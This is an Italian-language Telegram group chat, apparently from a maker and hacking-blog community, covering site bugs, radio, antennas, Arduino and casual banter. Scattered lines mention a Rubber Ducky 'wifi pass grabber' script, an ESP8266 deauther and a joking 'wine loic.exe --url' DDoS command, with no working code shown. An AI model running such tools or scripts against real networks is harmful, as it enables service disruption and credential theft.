Ma avete messo solo i vecchi video?
Eh idem per me, di fatto alle 4
da voi domani chiudono le scuole
Da me si
Si
Mmh, da quello screen mi viene da pensare a bootstrap 4
siamo in due
CSS
questo è un problema del tuo browser eh
anzi della tua connessione probably
non ha senso che una connessione normale non carichi il CSS
In realtà è un problema ok del browser (me ne sono appena accorto perché era il browser di instagram che fa cagare)
Però è anche un bug del sito
Infatti nella pagina contatti esce un faq
Su browser normale
sì beh assolutamente, ma fidati non è facile supportare 27 (numero a caso) versioni diverse per ogni browser
Mentre boh chissà per quale motivo qua esce una richiesta di contatto
Si certo assolutamente
 manda le foto a 
Ragazzi, le segnalazioni a 
Già inviato
In bici sotto la neve è bellissimo
Cosa ci fa questo bot?
io fino a l'una, poi sono andato a dormire perchè oggi avevo due verifiche. Cicca e gli altri fino alle 2
È un pelino completamente inutile
beh...
Non abbiamo usato bootstrap
Appena finisco di mangiare provo a fare una cosa che dovrebbe sistemare un po' di cose
ma è solo in alcuni browser
come Safari e quello integrato di Instagram
Anche Internet Samsung
Mazza, questa mi tenta
Falla subito... a parte il fatto che la tariffa dovrebbe essere di un mese come da legge
Ottima
È che ho già 15gb e 1000minuti a 5€, spenderei il doppio

Beh ma se ti bastano tieni quelli
Lass perd allora
Io 7€ 7gb e 1000 minuti
Da aggiungereee
Ti fregano eh perché tra poco diventa mensile ed andrai a pagare la stessa quota annuale per 12 mensilità al posto di 13
Quindi al posto di 10, paghi 10,83
Wow grazie chi l'avrebbe mai detto
A livello fisico e di interferenze
Non passare al lato oscuro
io avrei detto la frequenza
La frequenza era gia nella domanda
Effettivamente
Domattina salgo in montagna a fare un po di radiofrequenza, da 432 MHz a 47 Ghz
wow
a 47GHz per trasmettere cosa usi? il tostapane modificato?
Guida d'onda che concentra le onde su un antenna microscopica
beh...non so come si faccia ma intuivo sarebbe stato qualcosa di microscopico
Le quide d'onda per quelle frequenze somigliano a dei corni (in inglese si chiamano "horn antenna" se vuoi cercare su google immagini)
Btw, sono una persona felice
do' un'occhiata mo'
uu, capito, e sti cosi servono per...far convergere in quel fulcro le onde tipo?
La prima 47 GHz, la seconda 24 Ghz, l'ultima 1296/2320 MHz
A cosa servono?
Servono a fare esperimenti sulla propagazione delle onde radio.
Proviamo a collegarci con altri appassionati.
Yes
Ci colleghiamo ? Sei attivo in 70 cm ?
Bello il sito
Sono radioamatore ma sono carente di attrezzatura per motivi economici
Come radio per ora ho un portatilino cinese per i 2m e i 70cm, quindi o ponte o siamo geograficamente molto vicini
Siamo in contest, solo ssb
Allora nada, mi dispiace
ma quanto possono fare schifo i CDN di react
Potreste mettere il feed del sito che avvisa ogni nuovo articolo
come facciamo arrivare il feed? tramite mail? diventerebbe troppo uno spam
rss, o bot che manda qui o sul canale di overvolt
io ho usato feed rss di google alert e poi con ifttt me lo mando su telegram
Vi consiglio di disattivare i feed RSS per adesso, stiamo caricando molti articoli 

SIII mi sono arrivate le pennette per hacking da bangood 
queste
Io devo chiedere il rimborso



 perche?
è il sito che converte gli script rubber ducky in arduino
non taggatelo per ogni cosa
eh ma lui sa rispondere lol, il video è suo
lui non può rispondere, ha moltissimo da fare
nel caso puo rispondere lo fa
te sai perche?
nope, scusa ma non ho tempo perchè devo caricare un articolo
e cheppalle però
Avrai scritto qualcosa sbagliato, cerca il comando che dą errore


è questo qui, il wifi pass grabber, lo ho copiato ed incollato
e mi dice questo quando vado a convertire
Enomis:

 vuoi mettere questo con la fotocamera? Su questo ci puoi mettere anche Debian, sai che bei video escono?
Scusate team del blog... se ho trovato qualche bugggg  ve lo reporto da qualche parte o meglio se vi lascio in pace in questi primi giorni (visto che immagino siate piuttosto impegnati)?
Ah ottimo grazie
3?
Yup
Che tipo di connessione danno? Cioè a quanto vanno?
LTE qualcosa 
Adesso ad esempio faccio 8mbit ma prende poco
Non mi trova la pennetta Arduino *rubber ducky*
Come faccio?
Wtf
curiosità ragazzi, il sito è scritto in PHP?
Sì, controlla il jQuery su 

beh a parte che la potevo evitare come domanda dato che usate drupal come CMS
Drupal è in php
già scritto
k


Ho ordinato ben 6 di questi cosi ma non riesco proprio a usarli... ho provato su 3 computer...
nel mio computer non mi dà la porta disponibile

Qualcuno sa aiutarmi PERFAVORE??
 Meritate un posto sul mio desktop affianco a youtube. Il nuovo blog è fantastico!
Ecco il logo convertito in ICO
Potato love 

Avrei un abbozzo di post completo di immagini su come costruire un deauther ESP8266 , vorrei contribuire al blog
e vabbe grazie a tutti
devi prima essere accettato da Marco, presentarti, fare una videochiamata, essere stalkerato... 
Ah fantastico
Dopotutto parlaimo di hacking quindi un pò di stalking ci sta
Mmmmm 

Marco, ma la macchina poi c o sa aveva?
Procurati questo con l'App Torque.
A qualcuno interesserebbe il mio leeco le max2?
❤️❤️
Sembra una ricevente lol
gente, riguardo sempre al mio progetto con arduino, posso in qualche modo connettere direttamente la webcam all'arduino e usare il cavetto che uso per connettere l'arduino al pc come unico seriale per entrambi i dispositivi arduino e webcam?
giusto per risparmiarmi un cavo usb chiedo
tipo sdoppiatore usb o qualcosa del genere, non devo far interfacciare in alcun modo arduino e webcam, mi serve solo usare l'arduino come ponte tra webcam e pc usando sempre lo stesso cavetto usb se possibile...perchè vedere 2 cavi che escono fa brutto
Non credo
Arduino uno?
arduino leonardo pro micro
Mi sembra un po' surreale
SI
SCUOLE CHIUSE PER NEVE ANCHE QUI
ma mi basterebbe passare dati senza doverli interconnettere....tipo, le usb hub come fanno?
mahonna, si salta la verifica di informatica, rattristati
qualche amante del black humor vuole fare un gioco bello?
Per una volta che avevo fatto esercizio
memory con i morti?
Vai
no... ma si fa con le carte
vi mando il link del gioco in privato
password: bananaalsugo
ok?
Ok
con delle carte bisogna fare battute blacj humor
Ma è carte contro l'umanità?
tipo
una copia
Iuh
?
pure tu?
Si
Una replica online
COSACOSACOSA
Mi hai convinto
DOVECOMECHIQUANDOPERCHÈ
Domani vai?
filippo tu vuoi giocare?
almeno...da questa parte del monte le hanno chiuse
È impossibile dato che tutto il triveneto è chiuso per neve
non ho tempo, sorry 
ok 
da questa parte no 
Anche verona e rovigo, manca padova ma anche lì in teoria
dovete loggare?
beh se le hanno chiuse qua vuol dire che le hanno chiuse ovunque
devo finire di sistemare un paio di cosette
ok
gli altri?
Da me domani aperte
:C
Mi son saltato le meglio materie e guarda caso vado il giorno più pesante della settimana
Ragazzi vi prego aiutatemi a costruire un'antenna
Prendi un filo da 50ohm e taglialo
Se non lo hai usa quello dell'antenna della tv
Io devo fare un'antenna del genere a 13.56Mhz
Costa 280€ questa...
Anch'io!
Mi da questo errore con qualsiasi sito
Anche su Chrome
Non da problemi a me
No in realtà me lo fa solo con google e youtube
E non mi apre neanche l'app di youtube
Non mi va neanche Google Assistant, è incredibile 
Da computer non ho problemi..
controlla la data e l'ora
devono essere esatti
Ora scopri un mimt
Passa a me
In Veneto tutti a scuola
Ma dove
E qui in trentino nulla
Da me in Veneto sono tutte aperte
Non danno manco neve ahah
boh, io domani so che sto a casa e quindi sono felicio
Scusate una curiosita
Vedo um sacco di progetri basati su Alexa, che poi mandano ad amazon per comprare (alexa) ma ancora non ho capito e' um hardware oppure software ?
bene, e ora che ho fatto questo con la calcolatrice nuova mi sento un essere completo
Ma 
Che calcolatrice è??
la mia nuova ti-84 plus ce-t
Ah ok
-2+2=0 anche se prooobabilmente gli integrali non funzionano così ma sshhh
È una funzione dispari... L'integrale lo puoi immaginare (circa) come l'area con segno tra il grafico della funzione e l'asse x
si e in sostanza essendo uguale sia sopra che sotto la somma delle due da 0 giusto?
Esatto
Si può espandere la memoria flash di una board, tipo un Arduino nano?
beh...ha senso
Infatti ti dice che è zero
Benvenuto!
Grazie
That's good 
Devi mandarlo a 
 , non qui
We are updating
Aspettate ma...
Ancora sono helper? :D
A quanto pare
Yeeeeee :D
❤️
rip php del blog
Eh il tempo di caricare la nuova versione di drupal
drupal monello
Più che altro, server lento
usate AWS?
o cose più da normie
Magari
Fate tante donazioni a marco che così passiamo lì
ahaha ecco
avete la OVH più cheap che ci sia, sicuro
La cosa più economica trovata
siamo li allora
ma comunque hostare bot per telegram e discord con heroku>>>>
dai, che caxxo di figata, c'è gente su internet che si è anche messa e ha creato i peggio programmi per la modellazione 3d pure per questo modello di calcolatrice, mo' installo pacman
abbiamo raccolto un po' troppe mail per il blog  le ho incollate ed è crashato Gmail
Ma hahahahah
Ti trovo un plugin di drupal che gestisca una mailing list seria con database
Rip
Ragà ma lo fate in PHP in 0 secondi
movate 
PHP schifo 
Tutti con sta storia... È VERSATILE
Semplice e veloce

Allora... È semplice da installare va ovunque, semplice da imparare gestisce bene i database, lo puoi ficcare ovunque
Cosa c'è di meglio?
Cicca ☺️
hahaha, 
Si..
"Lo puoi ficcare ovunque" Cit.
Pensa a installare i millemila plugin che devi ancora installare, piuttosto
Pure nelle pagine HTML
No, non per quello...

Si, entra anche la
ha una lista "Pesavento Keep" piena, se crasho lo mando in tilt 
AHAHA
Lol parlando di liste mi avete fatto venire in mente la quantità industriale di roba in HTML che ho da scrivere
Va be' lo faccio DoMaNi
È troppo che non resetto 
No, no ma a me va bene anche così 
Scusate ma l’episodio 1 di Arduino verrà caricato o no? (Sul blog intendo)
in teoria no, ci sono troppe poche cose da scrivere
Ok grazie mille
Ti hanno risposto perché in realtà ero curioso e avevo lo stesso dubbio 
Boh
Alexa è l'assistente vocale di Amazon ma in italia non viene venduto
non si chiama Alexa anche il coso che fa il suono dell'assistente Alexa?
Il coso si chiama Echo mi sembra
ah sì, justo
❤️grazie da parte dello staff
In ogni caso non si vende in Italia 
Di nulla ☺️
qualcuno ha fatto hashcode?
 il canale delle offerte chiama 
Grazie
La metto per domani
Intanto togli il ref di galeazzi 
Aggiungo
L'ho trovato sul suo canale Delle offerta, Sorry 
E quello di offertedalweb
Yesss 
Buongiorno
Cosa c'entrano quei due cancri con Germano Mosconi
Li impizzano dappertutto

evitiamo di chiamare qualsiasi persona "Cancro"
Ma è normale che il Cerca mi "segua" nella pagina ??
100 euro di calcolatrice? 
aspetto che carichi la foto e ti dico 
comunque se dovete segnalare bug mandateli a 
, così non ce li perdiamo
Però lo sono
ok, decisamente no  stai usando Samsung Internet, giusto?
Si
Io anche in realtà alla fine ho fatto "sito desktop" perché mi dava fastidio
ok, aggiunto ai bug da fixare, thanks 
Idem, ma lo avevano già detto che il sito era ottimizzato per PC, e non per smartphone
 ora partono i feticismi con Python-Flask
Stai dicendo che Favij e Fabio rovazzi non sono dei cancri?
No sta montando il flame
stiamo sistemando, al più presto sarà ottimizzato per tutto
sto dicendo che non è bellissimo dire "cancro", di qualsiasi persona si stia parlando
+464618161646
Ehi io amo favi

all'incirca, ma ne vale la pena
ci gioco a pacman

Non rende onore
A Mosconi intendo
giusto
Ragazzi scusate una mano

Voglio costruire tipo un corpo umano di certone (tipo solo la sagoma) vabbè è mettere robe comunque... Mi serviva una mini pompa (non voglio spendere soldi o il meno possibile) e ho trovato questo coso in una lavatrice
Secondo voi è una pompa??
In realtà nella lavatrice già ho trovato la pompa dell'acqua ma non capisco cosa sia sto coso
Uff io devo capire come collegare il cavo in rame all'attacco per l'antenna
Sto scrivendo con un russo per scoprirlo
dopo aggiornaci eh
Help meeee
Non capisco
Su internet non dicono niente di sto coso
Neanche sulle antenne
fakiu gugle
Laik dip web
Ha detto di connettere il filo interno con il segnale è il cablaggio esterno con il ground
Cioè la messa a terra va
Eh ma mi sa che non ha capito quello che volevo fare
Ha capito questo (molto stilizzato)
aavrei un paio di cosuccie da ridire sul tuo inglese che mi triggera tantissimo ma vabb, apparte a quello, tu hai un'antenna tipo quella che avevi inviato l'altro giorno e vuoi capire come connettere quella ai cavi che ti ritrovi?
Ajo
Esatto
Vabbè evviva ma bonu si sono capiti
domanda n.1) che cavi ti ritrovi?
Ahhhhhhh
Avrebbe senso
Rami in cave da 50omh
Cioè dovrei ancora comprare il tutto
io si :D
ma questo non c'era nella mia lavatrice
ook, quindi, esattamente che circuito/cosa vuoi fare te?
a cosa la attacchi l'antenna?

Allora, io dovrei collegare questa antenna
Ad questo rfid reader
Manco nella prima che ho smontato io solo che mi piacerebbe fosse una pompa
dagli corrente e vedi cosa fa
Perché la pompa che ho trovato non ci entra in un finto cuore di cartone
Gira qualcosa e non passa aria ma non sembra utile
buttaci dell'acqua dentro e vedi se te la spara ovunque
ok si...mi sto sentendo povero, apparte ciò, invia l'rfid reader che vediamo, comunque cosa stai tentando di fare quindi? rilevare oggetti o altro con le radiofrequenze?
Il cuore che spinge un liquido rosso in tubicini trasparenti
Proverò 
L'antenna è sbilanciata? In caso il centro del coassiale va sul + del rtx e la calza va sulla massa del trasmettitore
sshhh
A volte so a volte no
Ci sono pompe 12V piccole meno di un pugno
Se è preso da una lavatrice, molto probabilmente è una elettrovalvola, le pompe nelle lavatrici sono grosse
?
Avrò capito metà del messaggio

Il cavo coassiale ha un filo singolo al centro e all'esterno ha una calza.
Il centro va collegato all'uscita del trasmettitore, la calza alla massa del trasmettitore
Ah okay ho cercato su internet cos'è il cavo
Eh sì infatti
Il problema è che proprio non so come attaccare il cavo in rame a sto cacchio di cavo coassiale
Comunque mi sembra strano che il trasmettitore non abbia un connettore sma o bnc
In teoria si può collegare no?
Ai pin
Si puó. Il modo piu brutale e veloce è usando saldatore e stagno
Hahaha che stalker
Si può fareee
Bisogna capire cosa saldare
Quella è una elettrovalvola di carico dell'acqua. Per le pompe piccole devi guardare quelle che si usano negli acquari
Come sopra, il centro sul uscita del trasmettitore e la calza sulla massa dello stesso
Maronn che casin
Gli RFID reader con gia pronto l' attacco costano 500€
Ma che cosa bella ora lo voglio fare
Il primo utilizzo realmente utile del mio arduino
Bella questa
 ciao, anche ora nel 2018 hai NordVPN? Se si la consiglieresti? Grazie
Io la uso perche non tiene traccia di log
O almeno così dicono
Poi ha dei buoni ip
capitio, grazie della risposta. è veloce?
Si si è veloce
Per lo streaming è ottima

La consiglierei ma attualmente non la ho
Dividevamo l'abbonamento come si fa con netflics, poi gli altri si sono tirati fuori
Ma tanto la hai sul vps
Si appunto: ti protegge dfa intercettazioni ma sicuramente non è anonima
Dici che dicono bufale?
nono: nord è 100% sicuro
Meno male l'ho comprato apposta
Mi era stato consigliato all'epoca da gente... anonyma... che se nordvpn non fosse sicuro sarebbe già da anni dietro le sbarre 
Ave!
</robe in latino>
Uff
<corporis></corporis>
Soprattutto perché qui si parla Italic 

\ban

 
É una doppia elettrovalvola. Manda l'acqua nel cestello o nella vaschetta del detersivo
Porca puttana neve in tutta Italia...
In Sicilia 20 gradi dio****
Non solo in Sicilia 
Cioè che cazzo anche a Napoli ha nevicato
Qui neanche l’ombra
Da me solo 1 giorno
Ragazzi, un sito tedesco sta regalando Arduino Nano
Si, certo ahahahah
Az delivery
Ordinato ieri io, hanno spedito stamattina
Obv non è originale
Già cambia
Solo Arduino?
Anche un 0.96 oled display
Voglio provare a costruire un piccolo orologio da polso
Perché era obbligatorio da prendere se volevi Arduino?
No
Non ho capito allora
Che fanno? Lo regalano?
Perché mi serviva
Si
Uuuu  usa un attiny 85
Senza comprare niente?
Si
Paghi solo 3€ di spedizione
Quanto Arduino dalla Cina
Hai ragione, ma non so usarlo
Questo arriva in 2/3 giorni
Vabbè è come Arduino...basta avere un Arduino per programmarlo
Uh
L'ho fatto qualche anno fa
Orologio binario
Che bello
Geeky
Era un progetto che ho trovato su internet e modificato
Io probabilmente userò un Arduino Pro mini
Anche ...il problema più grande è la batteria
Attiny non consuma quasi nulla in standby
Diciamo che più che orologio, è altro
Tipo ""armatura""
Prende parte dell'avambraccio
A ok allora entra anche una batteria al litio con caricatore
Sisi, spero che 500 mAh bastino 
Si ...se togli i led dalla scheda
Il led di Power
Oppure una 1000mAh
🤔
Posso castare un int in char su arduino per avere il carattere corrispondente a tale int?
quel coso è orribile perché ti costringe ad usarlo con la tastiera tra i piedi, metti che vuoi usare il telefono in verticale ti arrangi
Si l'ho fatto per sbagliato una decina di volte...ma non so come
Presa adesso per 3 anni a 99$ (86€) con un codice coupon. ottimo prezzo direi
Qual è meglio?
la A?
Okk
le altre non sono posizioni molto diffuse e crei solo confusione verso gli utenti più imbranati 
Perfetto, grazie
Ma è sempre lo stesso 🤔
No, cambia la posizione dell' "indice"
ma il PHP è oggettivamente merda
vuoi paragonare PHP a node.js ?
ops è di ieri sera il messaggio
Non è il buon vecchio (char)int?
Penso che funzioni uguale come per le altre variabili
 Ci sarai alla Fiera dell'elettronica a Montichiari o alla fiera del modellismo a Verona?
:c
 si
voglio imparare la programmazione
come posso fare
Grazie 
da quale linguaggio inizio
dipende cosa vuoi fare
siti internet
Html
Php
hai delle guide per impare da zero
Sinceramente no
Ti consiglio di dare uno sguardo su W3school, è ottimo per iniziare
Modellismo Verona venivo spesso, quand'è?
grazie
Sera ragazzi
Cosa ne pensate di JavaScript?
Perché
Ah ma era uno steacker
Non ha senso di esistere, è un linguaggio orripilante e pieno di schifo. Alcuni big di questo gruppo possono confermare
Ciao
Hey
Rido
schifo
Video epico 
Ma non è vero
Il 17 marzo se non erro
Montichiari invece é il 10
Sempre qui a marzo
beh vicino al 100% 
Se trovate casini sul blog scrivete pure a 
 ma potrebbe essere normale perchè sto cercando di sistemare un po di cose

Oltre a gearbest e banggood, dove comprate componenti?
Pinnalo
Non posso
Ah
 pin this
chi ha fatto il fork in c?
la barra di ricerca dovrebbe essere più o meno sistemata, anche da mobile
a meno che non scrollate
ok, fixato anche lo scroll in modo un po brutto, ma per il momento va bene cosi
Ragazzi cosa bisogna fare se la raccomandata estera (proveniente da banggood) risulta consegnata ma non è stata consegnata a me?
bannato di nuovo da ignuranza criuz 
qualcuno mi può dire se da mobile si capisce di più ora con quelle due iconcine che quel menù è scrollabile?
 IL blog é come le seconda baguette?

Rip
lo sta diventando piano piano 
No hanno bannato il gruppo
ah ecco
eliminato proprio? 🤔
Domandina veloce, c'è un limite massimo di memoria che posso occupare (esempio ho 6000kb di memoria, ma è meglio se non supero una soglia di 5000kb)?
Morto
Nope
Quindi se impazzisce la board è perché sono troppo bello?
 
Noh
Raga a chi devo segnalare bug di 
?

Il mio prof di architetture lo chiama "L'abominevole Java"
Ok
Onesto, anche se non c'entra nulla con java
Raga ma sta storia che fare i port scan é illegale ??
Ti dico solo che è riuscito ad arrivare a parlare di raggi cosmici
MA COSA
Era autorizzato
Programmer jokes
Lo mando così va
Cito
Eh ma la mano è la mano
LOLLO AIRPLANES 1 TO 
 we have a serious problem with this shitty bot
Cos?
Lul
 stai ancora cercando il PC?

Tu cosa mi consigli tra Metodi matematici per l'informatica e fisica?
Cos'è metodi matematici? Tipo matematica discreta?
E sai circa i programmi dei due corsi
il bot per programmare come si chiamava? con il compilatore
rextester?
Bot for executing snippets of code; 
 to get more information, 
 for list of languages. 
no 
Nope li vedo domani tranquillamente, credevo che anche voi la faceste
Comunque se andate nella sezione Contatta del blog c'è scritto tutto
Noi facciamo fisica adesso e il primo anno abbiamo fatto quello che penso sia il tuo metodi matematici.
Secondo me è più interessante metodi matematici, soprattutto se hai fatto bene fisica alle superiori e se il corso di fisica è abbastanza base
thanks
Mmmm perfetto, ci penserò contando questo ahah

 Facci sapere se ci sarai a Verona o a Montichiari
Ragazzi, Skrill, è sicuro? Offre un sistema di protezione come PayPal?
Vi spiego, devo acquistare online da un privato. Ha detto che accetta solo Skrill e non mi fido, non conoscendo appunto il sistema. Cosa potete dirmi a riguardo?
Sicuro sì, protezione no
Nel senso che la transizione avviene senza problemi ma acquistando da un privato, non ho la sicurezza che il prodotto mi arrivi, giusto?
Già
Si
Ma comprare da siti più affidabili invece che da gente sconosciuta?
Cosa che PayPal invece, assicura, giusto?
Ni
Sto comprando un usato
Prima devi specificarlo (e così facendo PayPal si prende una commissione) e poi la procedura non è istantanea
La procedura=la transazione?
La procedura per richiedere il rimborso
Ah, capito, grazie
Hey hey guardate che fierezza
fatto oggi al tandem di sistemi embedded e per poterlo fare prima mi sono dovuto sorbire 2 ore di spiegazione sulla legge di ohm :D
Uaa
ee anche un paio di altre cosuccie sempre riguardo quello all'incirca....e la prossima volta si inizia con i pin analogici
Esp8266?
noh, nxp lpc1768
una bestia da 70 euro...ha addirittura un output analogico sto coso
Hehe
Aspetta di arrivare a quella di joule
nono calmo, con "e cose del genere" includevo pure quella...purtroppo, quanta sofferenza
Spe, non so se mi ha stupito l'output analogico oppure i 70 euro
e ora mi tocca pure studiare chimica
Nel dubbio 
Ahah
A me no
"Ma l'output analogico lo può fare anche Arduino "
output analogico non nel senso di pwm ma proprio voltaggio variabile in output
No, solo PWM
soffri
Eh appunto
ma lo so, era una battuta pessima 
tanta roba
Fidati che lo faccio
Giochiamo a PYX?
mi divertirò a trasmettere con le sinusoidi, addio onde quadre
Ovvero?
Il robo black humor
aanche se effettivamente, 70 euro sono un peeelo tantissimissimi ma non credo ci sia molto da fare...non so se ne esistano le cinesate come con gli arduino, non credo
Vi sembra abbastanza comprensibile?
 e questo è tipo il prezzo più basso che gli abbia trovato, su amazon e un po' ovunque sfonda le 3 cifre di prezzo :/
A quel prezzo compri un KIT Raspberry Pi 3 completo ._.
si...ma un rasp non ha manco lui un output analogico
forse rpi4, chissà
Volevo usarlo come proporzione
zizi
Prezzo scheda singola: £108,37
si..non volevo dirlo ma sul sito ufficiale costa 50 dollari tipo
Ciao amiciiiii
Giulian cosa ci farai con quella scheda ?
se lo devo comprare lo prendo da farnell che sta a 40 dollari + spedizione
 
 
il tandem, ha certe di quelle potenzialità che ho una bella scelta per cosa fare come progetto da esporre all'esame, idee?
Emhhh ni
Al momento non mi viene in mente nulla...
Attaccaci un ESP... e niente, attaccacelo e fatti venire delle idee
yup
 Non usavi sublime? 
Comunque si
Sì, ma guarda sotto e ti convincerai a passare ad Atom
Hai abbandonato sublime per un plugin musicale?
-.-
No, perchè Atom è:
1) Open-Source
2) Ha un package manager decente
3) è mantenuto da GitHub
Peggio di stallman, mi preoccupi
Mi è scappato l'invio
Io non ho mai avuto problemi con quello di sublime

Ok
Io sublime son passato da amarlo a odiarlo
Nah, cioè io amo Sublime ed Atom allo stesso modo
Col primo ci sono cresciuto e mi ci sono fatto le ossa
Che editor è?
Installato da circa una settimana e mezza e mi ci trovo ancora bene
Lo proverò, grazie
È bellissimo
O quello o Visual studio code
Se non sbaglio visual studio con tema dark
Atom*
Il più potente attacco DDOS mai esistito è stato fatto oggi a GitHub
*ieri
Sparati
Ah ups, l'unico messaggio che non ho letto e quello in cui diceva che era Atom
Forse è una stronzata.....ma a me sembra un attacco all'Open
Visto.. Sfruttando la falla dei server mal configurati
Non è una cosa da poco
Nono, assolutamente
Non a caso, è il più potente
Della storia
Uuh beh marco Verona ci starebbe
Perché proprio 69 dovevi scrivere?
Ragà avete sentito?? 1.35 terabit/s di attacco DDoS a GitHub
nonono tu devi capire una cosa, quello era un contatore che partiva da 9.9 e scendeva e a 0.0 ripartiva da 9.9 ed è un contatore di secondi quindi la prima cifra cambia ogni secondo e la seconda ogni decimo, io ho premuto e ha fotografato proprio quello
Ma nooo
yeep
Lol
Tzh, dilettanti
Ci sono stati attacchi DoS (non distributed) più potenti
Ma appunto
Github proprio
Quando avevano hackerato AWS per avere banda infinita sul proprio account e avevano martellato la BBC mi sembra fossero 4TB
Amanti del closed?
Sono un Hackerrr 
Eheh citazioni che non puoi comprendere
Nono lascia stare DJI che DJI sono i migliori e basta
si ma il bello è che non era manco voluto
cos
MARCOOOOOO cosa cazzo hai fatto

Ti linko l'articolo?
Mah
(non la capirete mai, a meno che tu non sia nel team di Scontino)
  
Hhahahahahahahhagagaghahahahahahahhaha
L'avevo detto che era meglio non fargli mettere le mani
This
È lo sticker che meglio ti rappresenta
❤
EH VOLEVI
Tutta colpa di Marco se GitHub è stato dossato
Ora lo denunciamo
la prossima volta sto zitto e ti aspetto, sennò diventano 10 tb/s 
Eh beh sto dossando anche quello, che credi?

previdente
Lo dico ammiocugggggino
hai fatto 
? 
Ha fatto wine loic.exe --url 
No, volevo solo sapere come avevate chiamato quella pagina
No, è andato su 
 
Un tizio con cui ci ho litigato mi ci voleva prendere per culo con hackertyper
Si diverte a dire che è hacker con le foto al cmd verde e i numeri come matrix
Poi non sa installare kali su VM

vi mando una parte della chat, è una perla 
Muoviti che ho sonno e devo dormire
Ahhahah
Mi passi lo sfondo che hai?
Non c'era in realtà
Silenzio quando io parlo, io sono il Founder del gruppo e ho il potere assoluto
è in quelli di Telegram
Ecco 
era per sfotterti ❤️
Ci avete messo tipo mezz'ora ad aggijgnere il repo

c'è sempre una prima volta in cui bisgona fare pratica, eh Marco 
E io che ero lì davanti al computer coi popcorn...
hahahaahahahahahah
Mi sono divertito un botto
Invece di dirmi "hey per accettare l'invito loggati" se ne usciva con una pagina di "404, PROPRIO NON ESISTE" in cui non c'era nessun bottone, men che meno il login
 
 
 
 scusa ma è importante, guarda il gruppo producer prima di subito
ahahhhhhhaahahaahhaahahahahahahahahahaha
Internet Explorer
Pff roba da niente
Orca Troia


Ma è vera questa cosa???
A me sà di bufala 
Mi sa di clickbait
Sembra una yagi
Sono più semplici le cantenna
Mix cantenna yagi
ma esistono api gratuite di whatsapp?
che permettono anche di vedere il numero dal quale proviene il messaggio
haahahahahah le antenne quelle belle
Io ho fatto una cantenna con un barattolo di orzo
comunque c'è una cosa che proprio odio: perchè whatsapp non ha delle cazz di api fatte bene e ben documentate come telegram?
cioè.... c'è solo una cosa per mandare un messaggio se ben ricordo
zuckemberg... mi deludi
Ma usa telegram e manda a cacare whatsapp
è quello che già faccio 
Mi chiedo come faccia whatsapp a esistere ancora... Fa veramente schifo
i miracoli
Quotone
Stesso motivo di windows
Ma per uno che è alle prime armi con Python è fattibile fare un programma che dia un’interfaccia grafica ad arduino tramite seriale?
E cosa ci fai?
Se con interfaccia grafica intendi una console con valori che si aggiornano, è fattibile. Se invece vuoi una vera e propria interfaccia grafica... Boh, non ho mai usato interfaccia grafica con python
dove hai imparato? vorrei provarci
a che frequenza?
Pensavo di fare una specie di tabella con i valori che si aggiornano letti dalla seriale
 a un mio amico occorre un dispositivo dove poter installare kodi, infatti sul raspberry 3 gli lagga lo streaming.
che gli possiamo consigliare???
Non ci sono tipo beagle bone e odoroid? Se non sbaglio hanno anche versioni più potenti
 te hai il modem fibra tim?
Yup, anche io..
Che sbatta è avere il fisso come VoIP
Ci sono modi per tenerlo in FTTP e non in FTTH?
Eh si deve
Eh più che altro se spegni il modem la sera non ricevi le chiamate (cose che da una parte è un bene, dall'altra è un male se succede qualcosa)
Yup... Ma perché spegni il modem la sera? 
É a tipo 30 centimetri dalla testa di mio fratello ahaha
Ho sempre desiderato un fratello con tre braccia 
Già ha il capocchione, pensa se è costantemente bombardato ahaha
Il padre della mia ex lo aveva messo in camera sua, ed era costantemente acceso
Mmm boh non so quanto possa essere dannoso, ma non basta spegnere soltanto il WiFi?
Sentivo già il cancro salire ✖️
Posso spegnere il WiFi senza spegnere il modem?
Why not? Non so quanto possa essere macchinoso, ma si può fare al 99%
Questo non lo sapevo
Adesso vedo, grazie 
 ❤️❤️
Altrimenti una soluzione più pratica può essere mettere un ripetitore da qualche altra parte e tenere acceso il WiFi suo e non del modem
Illustrami
Avevo già pensato, ma credevo che si parlassero via WiFi
Nah lo attacchi via LAN
Tipo come ha fatto marco
That's a problem
Non so molto più dei nomi e che sono più costosi d più potenti.. Prova a vedere su Google
O via powerline insomma
In effetti a questo non avevo pensato
Il WiFi viene distribuito dalla powerline, quindi?
No la powerline ti porterebbe il segnale via cavo dal modem della Tim al ripetitore
Con il modem Tim posso risponderle alle chiamate dal PC?
Dal telefono sicuramente, c'è l'app apposta
Via LAN o anche fuori casa?
Telefono intendo smartphone 
Ovvio
Nelle impostazioni parla anche della rete mobile, a che serve?
Posso impostare un determinato PIN wps?
Credo anche fuori casa
Ma fa talmente schifo come app che la ho installata solo per provare
Wow
C'è un tool per win che installa in automatico i driver del PC?
Mmmmm il problema è che ho una disposizione della casa fatta proprio ad cazzum
Vabbè altrimenti si può sempre spegnere solo il wifi
Mi sa che dovrò fare così
Chi ha eliminato i messaggi?
Mi serve il nome del programma
'desso?
nessuno
Driver Booster
a parte che Windows Update lo fa in automatico, ma vabbè
Quell'altro
tu hai chiesto se ce ne sono  altri non li ho presenti
Anteprima perfetta proprio 
HAHAAHHAAHAHAH
lo spamma su youtube ma vuole aspettare per mandare le mail... io boh 🤷‍♂
È il browser
Tu cosa ci fai con le antenne?
Oooh 
Wifi
Al massimo ci vedo la televisione
Con quelle sul tetto
Te?
Vorrei costruirmi un'antenna VHF e UHF, che mi consigli?

E si finisce scuola alle 11
Bella lì

Ah ho capito perchè sono uscito prima.. c'era il video di overvolt ed il prof di fisica doveva vederselo
☺️
Che bello, sto per fare 120€ di ordine dalla Cina 
Referral, vero?
❤️❤️
Ma il referreal vale anche per gli ordini piu bassi tipo 20-30€?
Yup
Ok
Se lo hai di Hobbyking, va bene!
Ah no 
Hobbyking non lo ha proprio
Sto ordinando una stampante 3d, e tante batterie

Si
Spedisce con Fedex, turnigy fabrikator mini II, costa 93 euro
bibidi bobidi bu, mo' Renato non ce sta più

Ho un problema raga, esiste una libreria Arduino che printi i caratteri / : etc?
?
Serial.print("/:etc");
hahaha
Sto utilizzando DigiSpark e non so perché ma per tutti i caratteri "strani" stampa cose brutte
Dove li vuoi stampare?
Probabilmente perché prima di usare qualcosa dovresti documentarti
Utilizzo DigiKeyboard.print() per scrivere sulla barra di ricerca etc
Wut
Perché quelli sono caratteri particolari che non stanno sulla tastiera
Devi premere i tasti che premerebbe un umano, quindi SHIFT + .
Non hai i : sulla tastiera?
Eh lo so, credevo ci fosse una libreria che li comprendesse o ci fosse un modo per concatenarli alla stringa
Lui non intende la seriale normale, intende la libreria Keyboard che simula una tastiera attaccata al PC
L'ho anche specificato
